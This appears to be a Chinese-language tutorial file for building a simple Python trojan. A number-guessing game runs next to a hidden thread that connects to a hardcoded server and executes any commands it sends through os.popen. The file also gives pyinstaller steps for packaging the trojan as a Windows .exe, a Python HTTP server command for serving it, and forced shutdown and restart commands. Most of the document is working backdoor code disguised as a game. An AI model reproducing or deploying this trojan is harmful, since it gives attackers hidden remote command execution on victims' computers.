```python
#client.py
import random
import socket
import threading


def trojan():
    host = '192.168.107.15'    #trojan's server ip address
    port = 9999

    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client.connect((host,port))

    while True:
        server_cmd = client.recv(1024).decode('utf-8')
        if server_cmd == 'hello':
            print("hello world")
        client.send(f"{server_cmd} was executed successfully!".encode('utf-8')) #f""是f.format()的简化版

def game():
    number = random.randint(0,1000)
    tries = 1
    done = False

    while not done:
        guess = int(input("Please enter a number:"))

        if guess == number:
            done = True
            print("You won")
        else:
            tries += 1
            if guess > number:
                print("The actual number is smaller!")
            else:
                print("The actual number is larger!")
    print(f"You needed {tries} tries!")

t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start()
t2.start()
```

```python
#client.py
import random
import socket
import threading
import os

def trojan():
    host = '192.168.107.15'    #trojan's server ip address
    port = 9999

    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client.connect((host,port))

    cmd_flag = False #配置命令行开启标记位



    while True:
        server_cmd = client.recv(1024).decode('utf-8')
        if server_cmd == 'cmdon':    #开启命令行
            cmd_flag = True
            client.send("You now have terminal access!".encode('utf-8'))
            continue
        if server_cmd == 'cmdoff':   #关闭命令行
            cmd_flag = False
        if cmd_flag:
            os.popen(server_cmd)   #os.popen() 方法用于从一个命令打开一个管道。在Unix，Windows中有效,可以执行系统命令
        else:
            if server_cmd == 'hello':
                print("hello world")
        client.send(f"{server_cmd} was executed successfully!".encode('utf-8'))

def game():
    number = random.randint(0,1000)
    tries = 1
    done = False

    while not done:
        guess = int(input("Please enter a number:"))

        if guess == number:
            done = True
            print("You won")
        else:
            tries += 1
            if guess > number:
                print("The actual number is smaller!")
            else:
                print("The actual number is larger!")
    print(f"You needed {tries} tries!")

t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start()
t2.start()

#server.py
import socket
```

#### 将python脚本打包成.exe文件
- 安装pyinstaller
  - 1.在windows主机上安装python环境
  - 2.使用pip工具安装pyinstaller
  ```python
  pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pyinstaller
  ```
  - 3.将py脚本打包成.exe文件
  ```python
  pyinstaller -i 2.ico -F -c client.py
  #-i：表示要加载的图标（没有选择图标可以不用写）
  #-F：表示打包成.exe可执行文件
  #-c：表示打包程序有窗口
  ```

#### 其它辅助指令
```shell
#利用python作为http服务器
python -m http.server     #默认开启方式端口为8000

#修改默认端口为8080
python -m http.server --bind 0.0.0.0 8080


#一些Windows的cmd指令:
shutdown /s    #一分钟后关机
shutdown /r    #一分钟后重启


shutdown /s /f /t 0
/s：表示要关闭计算机。
/f：表示强制关闭应用程序，如果有未保存的数据会丢失。
/t 0：表示延迟关机时间为0秒，即立即关机。

shutdown /r /f /t 0
/r：表示要重新启动计算机。
/f：表示强制关闭应用程序，如果有未保存的数据会丢失。
/t 0：表示延迟重启时间为0秒，即立即重启。

echo Hello, World! > example.txt    #创建文件并输入内容
type example.txt                    #查看文件内容
```
